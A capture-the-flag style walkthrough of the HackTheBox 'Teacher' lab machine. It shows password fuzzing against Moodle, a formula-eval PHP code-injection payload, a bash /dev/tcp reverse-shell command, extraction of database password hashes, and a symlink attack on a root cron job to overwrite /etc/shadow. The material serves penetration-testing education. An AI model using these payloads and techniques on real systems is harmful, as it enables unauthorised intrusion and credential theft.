---
published: true
---
Disassembly of ippsec’s youtube video HackTheBox - Teacher. Box includes a web-app that is vulnerable to a php bug with allows for RCE. The usage of pspy to discover cron jobs and taking advantage of a root task that leads to root access.


----------

Legal Usage:
*The information provided by execute@will is to be used for educational purposes only. The website creator and/or editor is in no way responsible for any misuse of the information provided. All the information on this website is meant to help the reader develop penetration testing and vulnerability aptitude to prevent attacks discussed. In no way should you use the information to cause any kind of damage directly or indirectly. Information provided by this website is to be regarded from an “*[*ethical hacker*](https://www.dictionary.com/browse/ethical-hacker)*” standpoint. Only preform testing on systems you OWN and/or have expressed written permission. Use information at your own risk.*

*By continued reading, you acknowledge the aforementioned user risks/responsibilities.*

----------


![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556698003804_image.png)


This series of write-up will contain comprehensive write-ups of hackthebox machines. In an effort to sharpen reporting techniques and help solidify the understand and methodologies used during penetration testing.


# Enumeration

nmap scan:

    nmap -sC -sV -oA nmap/teacher 10.10.10.153

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601191371_image.png)


(output)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601207307_image.png)


1 port open which looks to be the web-server on port 80.


## Investigate web-server

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601275223_image.png)


before continuing investigating site, start a dirbuster in the background as to always have something enumerating on the backend.

## gobuster (background task)
    gobuster -u http://10.10.10.153/ -w /usr/share/wordlists/dirbuster/directory-list-2.3.medium.txt -o gobuster-root.log -t 50

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601413066_image.png)



## Return to web-server

Check out links and see if site gives out types of extensions to figure out what type of web-server it is and if code is being processed.

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601474801_image.png)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601551242_image.png)


check out code for some css or static code:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601626713_image.png)


*images are tried to load an* `*onerror=*``"``*console.log*`

back on webpage access console with F12:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601705274_image.png)


*console is reporting “That’s an F”*

invesgating that `5.png`

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601771352_image.png)


*an error occurs as the image doesn’t seem to exist.* 


## download 5.png locally
    curl http://10.10.10.153/Images/5.png -o 5.png

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601858309_image.png)


Open file to investigate with xxd (hex editor):

    xxd 5.png

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601919186_image.png)


check the contents

    less 5.png

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556601954559_image.png)


we have a partial password at this point.


## find way into login to webapp

gobuster results:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602067019_image.png)


check out `/phpmyadmin`

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602091356_image.png)


*forbidden*

Forbidden workaround via burp:
Capture request and send to repeater

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602179978_image.png)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602205880_image.png)

- tactic *modification of host: localhost*

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602236167_image.png)


*forbidden*


- tactic *add X-Forwarded-For: localhost* 

check out link for more info: https://shubs.io/enumerating-ips-in-x-forwarded-headers-to-bypass-403-restrictions/

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602305042_image.png)


*forbidden*

In this example we could not bypass the 403 Forbidden.


check out `/moodle`

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602475723_image.png)


*dynamically created page. In right corner we do see a “You are not logged in”.*



## attempt login with credentials/forgot password

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602586415_image.png)


first move to see if the forgot password will enumerate any further information remember that the actual message stated “ I forgot the last charachter of my password. The only part I remembered is Th4c00lTeacha.” But doesnt give a username.

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556602674929_image.png)



Use forgot password to verify if a username is an account is valid.

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612182951_image.png)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612200640_image.png)


“*says that if supplied a correct username or email then an email should have been sent to you.” Not very helpful with enumeration.*

Login as guest:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612314804_image.png)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612299314_image.png)


*guest can’t access user accounts.*

Guessing the Username as Giovanni

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612385465_image.png)


Capture request with burp suite:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612457539_image.png)


send to repeater:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612480168_image.png)


*There are no CRSF tokens which would stop from enumerating with wfuzz*


## enumerating password with wfuzz
    wfuzz -u http://10.10.10.153/moodle/login/index.php -d 'anchor=&username=Giovanni&password=Th4C00lTeachaFUZZ' -w /usr/share/seclists/Fuzzing/special-chars.txt -hh 440

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612693774_image.png)


password enumerated as: Th4C00lTeacha#


## Giovanni Captured

Login:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612761478_image.png)


poke around server and nothing is of immediate interest. There is an upload under private files.


## searchsploit moodle
    searchsploit moodle

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556612892649_image.png)



## github moodle

Checking for any type of change log with issues addressed.

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556686550887_image.png)


of the files there is a `version.php` which should be checked with the version of moodle on the target system.


![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556686654409_image.png)


*from out target system only a blank page is returned.*


## enumerating moodle

google search: “moodle enumerate versions”

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556686882795_image.png)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556686858065_image.png)


*to check the moodle docs on page:*

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556686938983_image.png)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556686956009_image.png)


*URL states that we are* `*/34*` *version.*

Google: moodle release notes to find date:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556687080001_image.png)


*Released 13 November 2017*

## google search moodle exploit

search: “moodle exploit 3.4 3.5” as both version where missing from the searchsploit

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556687310154_image.png)


ripstech blog offers a more detailed explanation as to how the exploit is going to function.

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556687374672_image.png)


exploit explanation in a nutshell:

    “There is en eval string within the `/question/question.php` which we turn an control the $formula and pass data straight to eval”

There is a metasploit module available but working manually work to create the exploit.




## manually exploit moodle

On moodle web-app searching for a way to add a quiz:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556687627968_image.png)


*Turn editing on under gear.*

Add an activity:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556687702182_image.png)


![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556687724181_image.png)


save a template and edit to add question that will have a formula:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556687871761_image.png)


Using the ripstech block post if we enter the str we should get a “success”

    $str= /*{a*/'$_GET[0]';//1.2};

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556688694712_image.png)


in this situation changing the `GET` parameter to `REQUEST`

    $str= /*{a*/'$_REQUEST[0]';//1.2};

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556688943064_image.png)


submitted:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556688985217_image.png)


*error regarding the semicolon, removed all semicolons and change the grade to 100%*

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556689121749_image.png)


(results)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556689145363_image.png)


*formula seems to have been taken over at this point but has an error in syntax.*

Searching around the question bank contains old questions from the creation of the box.

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556689242266_image.png)


investigating creator formulas to discover exactly how they passed the request:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556689292122_image.png)


Modifying original request and adding information from our sample:

    $str= /*{a*/'$_REQUEST[PleaseSubscribe]';//{x}};

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556689607748_image.png)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556689626465_image.png)


*resulted in the REQUEST being passed by the moodle web-app.*


## burp the REQUEST to RCE

Burp that exact request and sent to repeater and adding to send an ICMP packet:

    ...&PleaseSubscribe=ping+-c+1+10.10.14.3

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556689861084_image.png)

setup tcpdump to capture the packet:

    tcpdump -i tun0 -n icmp

*-n = no dns resolution*

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556689989773_image.png)


*packets are being sent from target equating to we have remote code execution (RCE) on the box.* 


# Reverse Shell

Sending the reverse shell with the RCE

    ...&PleaseSubscribe=bash -i >& /dev/tcp/10.10.14.3/3001 0>&1 (highlight ctrl+u to  URL encode)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556690371711_image.png)

## setup listener
    ncat -lvnp 9001

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556690408492_image.png)


*execute and returns with a remote shell of box.*


## upgrade partial sell to ptty
    python -c 'import pty:pty.spawn("/bin/bash")'
    background with ctrl+z
    stty -raw echo
    fg (enter)
    (enter)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556690543796_image.png)



## enumerating the web-server

first things should consist of searching for the database and poking around it.

to search for database:

    ls | grep config

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556690620676_image.png)


checkout `config.php`


![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556690664600_image.png)


*database credentials have been retrieved.*


## connect to mysql sever
    mysql -u root -D moodle -p

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556690755015_image.png)


Show tables and search for “user”:

    show tables;

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556690911141_image.png)


Show whats inside `mdl_user`:

    describe mdl_user

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556690997125_image.png)


show usernames and passwords:

    select id,username,password from mdl_user;

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556691047229_image.png)


*we now have bcrypt hashes for a list of users and 1 that looks like an MD5 hash. The fastest way to decrypt MD5 hashes is simply with google.*

Results:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556691161464_image.png)

    username: Giovannibak
    password: expelled



# Priv-Esc

with a passwd check we have a user giovanni and switch users and enter newly acquired password.


    cat /etc/passwd
    su - giovanni
    password: expelled

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556691280017_image.png)



## enumerating as giovanni

search the `/work` directory:

    find . -ls

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556691376073_image.png)


Check cron:

    ls /etc/cron.*

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556691418059_image.png)


*there is a cron.d for php*

    cat /etc/cron.d/php

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556691468418_image.png)


*nothing here just a session cleanup. Every minute an event is occurring… which the cron could be under the root user which at this point there is no way to view that without a tool* `pspy`.

download pspy: https://github.com/DominicBreuker/pspy


## build pspy
    GOOS=Linux GOARCH=amd64 go build

to download the extra packages

    go get ..package..

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556691978294_image.png)


rebuild:

    GOOS=Linux GOARCH=amd64 go build

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556692035129_image.png)


next were are going to send pspy to our target box with a `simplehttpserver`

target save location `/dev/shm`

    wget 10.10.10.3:8000/pspy

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556692174420_image.png)


execute, and now it is watching processes

pspy output:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556696986611_image.png)


*now we now that* `*/bin/sh*` *is running the backup.sh*

investigating the `backup.sh`

    ls -ls /usr/bin/backup.sh

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697064115_image.png)


read with less:

    less /usr/bin/backup.sh

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697102134_image.png)


(sidenote) to be able to clear the screen we need to export $TERM

    export TERM=xterm

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697157458_image.png)



## disassembling the backup.sh

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697275993_image.png)


we know at this point were moving to `/work` tar’ing a file moving to `/tmp` tar’ing another fold and then chaning the chmod. If we can point the `/tmp` file to `/etc/shadow` we will be able to grab the hashes.

pointing a file at another file with `ln`:

    ln -s /etc/shadow /home/giovanni/work/tmp

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697399942_image.png)


now after the cron is performed we can now control `/etc/shadow`

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697462961_image.png)


view shadow:

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697486900_image.png)


*and now we can edit this file and change the root password to giovanni as we know what it is.*

    cat /etc/shadow | grep giovanni

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697552505_image.png)


*now put it over the top of the root password:*

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697581235_image.png)



# Root&Loot

Switch users to root:

    su -
    password: expelled (giovonni that we just overwrote)

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697658852_image.png)

## the loot

![](https://paper-attachments.dropbox.com/s_6ECF295E465B7511B16CC3BDB079046D8A68D21F53D2BF223EF12FBD8573B95D_1556697698223_image.png)


----------

If you don’t know who ippsec is check him out at 

Youtube: https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA
Twitter: https://twitter.com/ippsec

